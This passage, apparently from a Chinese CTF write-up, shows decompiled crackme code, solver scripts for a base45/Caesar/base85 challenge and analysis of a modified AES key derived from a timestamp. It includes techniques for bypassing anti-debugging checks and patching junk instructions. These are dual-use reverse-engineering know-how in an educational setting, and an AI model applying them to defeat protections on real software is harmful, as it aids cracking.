class="number">122</span>, <span class="number">60</span>, </span><br><span class="line"> <span class="number">92</span>, <span class="number">108</span>, <span class="number">91</span>, <span class="number">61</span>, <span class="number">51</span>, <span class="number">42</span>, <span class="number">62</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">52</span>, <span class="number">67</span>, <span class="number">62</span>, <span class="number">122</span>, <span class="number">116</span>, <span class="number">48</span>, </span><br><span class="line"> <span class="number">76</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">51</span>, <span class="number">90</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>(<span class="params">_: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> S(R85.M(S(R45.R(_.encode()), <span class="number">7</span>).encode()), <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Secret <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入:&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    aaaaaaaaaaaaa = <span class="built_in">input</span>()</span><br><span class="line">    wwwwwwwwwww = l(aaaaaaaaaaaaa)</span><br><span class="line">    <span class="keyword">if</span> sssssssssssss == wwwwwwwwwww.encode():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;哦，对的。&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;哎，并非。&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>简单分析base45-&gt;凯撒-&gt;base85-&gt;凯撒，直接解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反向偏移的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_SSSooooyyooo</span>(<span class="params">s: <span class="built_in">str</span>, offset: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            new_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            result.append(new_char)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            new_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) + offset) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">            result.append(new_char)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向MMMMiiiiiio函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_MMMMiiiiiio</span>(<span class="params">encoded_str: <span class="built_in">str</span>, reverse_offset: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    MMiiiiiiooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(Miiooooooooo) <span class="keyword">for</span> Miiooooooooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">118</span>)])</span><br><span class="line">    decoded_bytes = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> encoded_str:</span><br><span class="line">        index = MMiiiiiiooo.find(char)</span><br><span class="line">        <span class="keyword">if</span> index != -<span class="number">1</span>:</span><br><span class="line">            decoded_bytes.append(index)</span><br><span class="line">    decoded_str = <span class="built_in">bytes</span>(decoded_bytes).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> reverse_SSSooooyyooo(decoded_str, reverse_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向RRRRyyooo函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_RRRRyyooo</span>(<span class="params">encoded_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    RRRRyooooooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(RRRRRRRyyyyyoooo) <span class="keyword">for</span> RRRRRRRyyyyyoooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line">    decoded_str = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(encoded_str):</span><br><span class="line">        char1 = encoded_str[i]</span><br><span class="line">        char2 = encoded_str[i+<span class="number">1</span>] <span class="keyword">if</span> i+<span class="number">1</span> &lt; <span class="built_in">len</span>(encoded_str) <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        decoded_str.append(RRRRyooooooo[<span class="built_in">int</span>(char1) % <span class="number">45</span>])</span><br><span class="line">        decoded_str.append(RRRRyooooooo[<span class="built_in">int</span>(char2) % <span class="number">45</span>] <span class="keyword">if</span> char2 <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decoded_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密整个过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_input</span>(<span class="params">input_bytes: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    step1 = reverse_RRRRyyooo(input_bytes.decode())</span><br><span class="line">    step2 = reverse_MMMMiiiiiio(step1, <span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> step2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密后的数据 sssssssssssss</span></span><br><span class="line">sssssssssssss = <span class="built_in">bytes</span>([<span class="number">57</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">114</span>, <span class="number">68</span>, <span class="number">56</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">34</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">78</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">59</span>, </span><br><span class="line"> <span class="number">95</span>, <span class="number">85</span>, <span class="number">63</span>, <span class="number">122</span>, <span class="number">54</span>, <span class="number">33</span>, <span class="number">77</span>, <span class="number">110</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">34</span>, <span class="number">109</span>, <span class="number">106</span>, <span class="number">122</span>, <span class="number">60</span>, </span><br><span class="line"> <span class="number">92</span>, <span class="number">108</span>, <span class="number">91</span>, <span class="number">61</span>, <span class="number">51</span>, <span class="number">42</span>, <span class="number">62</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">52</span>, <span class="number">67</span>, <span class="number">62</span>, <span class="number">122</span>, <span class="number">116</span>, <span class="number">48</span>, </span><br><span class="line"> <span class="number">76</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">51</span>, <span class="number">90</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密并输出</span></span><br><span class="line">decrypted_output = decrypt_input(sssssssssssss)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密后的结果: <span class="subst">&#123;decrypted_output&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="TimeSpaceRescue"><a href="#TimeSpaceRescue" class="headerlink" title="TimeSpaceRescue"></a>TimeSpaceRescue</h2><p>拖入ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-11Ch]</span></span><br><span class="line">    <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+4h] [ebp-118h]</span></span><br><span class="line">    <span class="type">char</span> Str[<span class="number">256</span>]; <span class="comment">// [esp+8h] [ebp-114h] BYREF</span></span><br><span class="line">    <span class="type">int</span> Src[<span class="number">4</span>]; <span class="comment">// [esp+108h] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">    sub_B220E0(<span class="string">&quot;Before input the key, make sure you&#x27;re on the same spacetime as Liv.\n&quot;</span>);</span><br><span class="line">    sub_B220E0(<span class="string">&quot;Try your key:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str));</span><br><span class="line">    sub_B22130(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">    <span class="built_in">memset</span>(Src, <span class="number">0</span>, <span class="keyword">sizeof</span>(Src));</span><br><span class="line">    initkey(Src);</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    aes(Src, <span class="number">0x10u</span>, Str, v4);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( Str[i] != byte_B26104[i] )</span><br><span class="line">        &#123;</span><br><span class="line">            sub_B220E0(<span class="string">&quot;Spacetime turbulence is detected, and rescue fails!\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_B220E0(<span class="string">&quot;Congratulations on rescuing Liv and successfully protecting the world!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先造aes用到的key，然后加密输入，所以先看initkey</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_B21DD0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__time64_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+4h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">__time64_t</span> Time; <span class="comment">// [esp+Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  BOOL pbDebuggerPresent; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> Src[<span class="number">3</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  LODWORD(v1) = sub_B22180(<span class="number">0</span>);</span><br><span class="line">  Time = v1;</span><br><span class="line">  v4 = sub_B21F80(&amp;Time);</span><br><span class="line">  <span class="built_in">memset</span>(Src, <span class="number">0</span>, <span class="keyword">sizeof</span>(Src));</span><br><span class="line">  pbDebuggerPresent = <span class="number">0</span>;</span><br><span class="line">  CurrentProcess = GetCurrentProcess();</span><br><span class="line">  CheckRemoteDebuggerPresent(CurrentProcess, &amp;pbDebuggerPresent);</span><br><span class="line">  <span class="keyword">if</span> ( !pbDebuggerPresent )</span><br><span class="line">    <span class="built_in">memcpy</span>(Src, (v4 + <span class="number">12</span>), <span class="keyword">sizeof</span>(Src));</span><br><span class="line">  md5(Src, <span class="number">0xCu</span>, a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">    *(i + a1) ^= <span class="number">0x14u</span>;</span><br><span class="line">  result = <span class="number">11673238</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    result = j + a1;</span><br><span class="line">    *(j + a1) ^= <span class="number">0x11u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到time我就有不好的预感，果然是根据时间戳，md5加密生成key，这里有个细节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00B</span>21E8E                               loc_B21E8E:                             ; CODE XREF: initkey+<span class="number">96</span>↑j</span><br><span class="line">.text:<span class="number">00B</span>21E8E <span class="number">50</span>                            push    eax</span><br><span class="line">.text:<span class="number">00B</span>21E8F <span class="number">33</span> C0                         xor     eax, eax</span><br><span class="line">.text:<span class="number">00B</span>21E91 E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                call    $+<span class="number">5</span></span><br><span class="line">.text:<span class="number">00B</span>21E91</span><br><span class="line">.text:<span class="number">00B</span>21E96 <span class="number">83</span> C0 <span class="number">05</span>                      add     eax, <span class="number">5</span></span><br><span class="line">.text:<span class="number">00B</span>21E99 <span class="number">83</span> C0 <span class="number">06</span>                      add     eax, <span class="number">6</span></span><br><span class="line">.text:<span class="number">00B</span>21E9C <span class="number">83</span> C0 <span class="number">07</span>                      add     eax, <span class="number">7</span></span><br><span class="line">.text:<span class="number">00B</span>21E9F D1 E0                         shl     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00B</span>21EA1 <span class="number">83</span> F0 <span class="number">02</span>                      xor     eax, <span class="number">2</span></span><br><span class="line">.text:<span class="number">00B</span>21EA4 <span class="number">83</span> C0 <span class="number">01</span>                      add     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00B</span>21EA7 <span class="number">83</span> F8 <span class="number">71</span>                      cmp     eax, <span class="number">71</span>h ; <span class="string">&#x27;q&#x27;</span></span><br><span class="line">.text:<span class="number">00B</span>21EAA <span class="number">74</span> <span class="number">01</span>                         jz      <span class="type">short</span> loc_B21EAD</span><br><span class="line">.text:<span class="number">00B</span>21EAA</span><br><span class="line">.text:<span class="number">00B</span>21EAC                               retn</span><br><span class="line">.text:<span class="number">00B</span>21EAC</span><br><span class="line">.text:<span class="number">00B</span>21EAD</span><br><span class="line">.text:<span class="number">00B</span>21EAD                               loc_B21EAD:</span><br></pre></td></tr></table></figure><p>本来这个位置是返回，但是看ida汇编代码就会发现，这里有点像花指令，因为再运行的时候会发现这个地方是要跳过的，所以可以nop了，然后就可以看到我的那个伪代码界面了</p><p>所以这个函数实现了，md5加密时间戳，然后简单加密生成key（注意，这个时间戳是否赋值是要根据是否处于反调试的）提到这里还有个细节，这个程序肯定要多次调试做，然后就会发现，无论怎么再main中下断点都会退出程序，我直接再start下断点追本溯源发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( dword_B264DC )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    dword_B264DC = <span class="number">1</span>;</span><br><span class="line">    initterm(&amp;dword_B24110, &amp;dword_B24124);</span><br><span class="line">    dword_B264DC = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> __scrt_release_startup_lock(v10);</span><br><span class="line">  v2 = sub_B22C41();</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( *v2 &amp;&amp; __scrt_is_nonwritable_in_current_image(v2) )</span><br><span class="line">    (*v3)(*v3, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = sub_B22C47();</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( *v4 &amp;&amp; __scrt_is_nonwritable_in_current_image(v4) )</span><br><span class="line">    register_thread_local_exe_atexit_callback(*v5);</span><br><span class="line">  initial_narrow_environment = get_initial_narrow_environment();</span><br><span class="line">  v7 = *_p___argv();</span><br><span class="line">  v8 = _p___argc();</span><br><span class="line">  a1 = main(*v8, v7, initial_narrow_environment);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_B22D6A() )</span><br><span class="line">LABEL_17:</span><br><span class="line">    <span class="built_in">exit</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    cexit();</span><br><span class="line">  __scrt_uninitialize_crt(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里有反调试，也就是那个if判断，每一次都要手动跳过一下，好的接下来看aes了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">aes</span><span class="params">(<span class="type">void</span> *Src, <span class="type">size_t</span> Size, <span class="type">char</span> *a3, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+10h] [ebp-19Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+14h] [ebp-198h]</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [esp+18h] [ebp-194h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [esp+1Ch] [ebp-190h]</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// [esp+20h] [ebp-18Ch]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">356</span>]; <span class="comment">// [esp+24h] [ebp-188h] BYREF</span></span><br><span class="line">  <span class="type">int</span> key[<span class="number">4</span>]; <span class="comment">// [esp+188h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12[<span class="number">4</span>]; <span class="comment">// [esp+198h] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7 = a3;</span><br><span class="line">  v9 = v10;</span><br><span class="line">  <span class="built_in">memset</span>(key, <span class="number">0</span>, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  <span class="built_in">memset</span>(v12, <span class="number">0</span>, <span class="keyword">sizeof</span>(v12));</span><br><span class="line">  <span class="keyword">if</span> ( Size &gt; <span class="number">0x10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a4 % <span class="number">0x10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(key, Src, Size);</span><br><span class="line">  de2(key);</span><br><span class="line">  sub_B21490(key, <span class="number">16</span>, v10);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a4; i += <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    de3(a3);</span><br><span class="line">    sub_B21750(v12, a3);</span><br><span class="line">    sub_B21170(v12, v10);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 += <span class="number">16</span>;</span><br><span class="line">      sub_B21B90(v12);</span><br><span class="line">      sub_B21990(v12);</span><br><span class="line">      sub_B217C0(v12);</span><br><span class="line">      sub_B21170(v12, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_B21B90(v12);</span><br><span class="line">    sub_B21990(v12);</span><br><span class="line">    sub_B21170(v12, v9 + <span class="number">16</span>);</span><br><span class="line">    sub_B21B30(v12, v7);</span><br><span class="line">    de2(v7);</span><br><span class="line">    v7 += <span class="number">16</span>;</span><br><span class="line">    a3 += <span class="number">16</span>;</span><br><span class="line">    v9 = v10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( byte_B26100 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; a4; ++k )</span><br><span class="line">      a3[k] ^= <span class="number">0x11u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典AES_EBC，但是有小魔改，我标记成了de2和de3，同样的这个函数的末尾也有一个小花，不过观察发现，a3一共加了32字节，所以后面的异或是不影响输入明文的，最后与flag对比，逻辑就清晰了</p><p>time—md5—&gt;key—de2—–AES-EBC</p><pre><code>               ^</code></pre><p>input—de2——— |</p><p>所以要。。。。。爆破时间，根据题目提示，2024的某一天</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MD5_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MD5_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count[<span class="number">2</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> state[<span class="number">4</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">&#125;MD5_CTX;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> F(x,y,z) ((x &amp; y) | (~x &amp; z))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> G(x,y,z) ((x &amp; z) | (y &amp; ~z))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> H(x,y,z) (x^y^z)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I(x,y,z) (y ^ (x | ~z))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTATE_LEFT(x,n) ((x <span class="string">&lt;&lt; n) | (x &gt;</span>&gt; (32-n)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FF(a,b,c,d,x,s,ac) \</span></span><br><span class="line"><span class="meta">          &#123; \</span></span><br><span class="line"><span class="meta">          a += F(b,c,d) + x + ac; \</span></span><br><span class="line"><span class="meta">          a = ROTATE_LEFT(a,s); \</span></span><br><span class="line"><span class="meta">          a += b; \</span></span><br><span class="line"><span class="meta">          &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GG(a,b,c,d,x,s,ac) \</span></span><br><span class="line"><span class="meta">          &#123; \</span></span><br><span class="line"><span class="meta">          a += G(b,c,d) + x + ac; \</span></span><br><span class="line"><span class="meta">          a = ROTATE_LEFT(a,s); \</span></span><br><span class="line"><span class="meta">          a += b; \</span></span><br><span class="line"><span class="meta">          &#125;</span></span><br><span class="line"><span 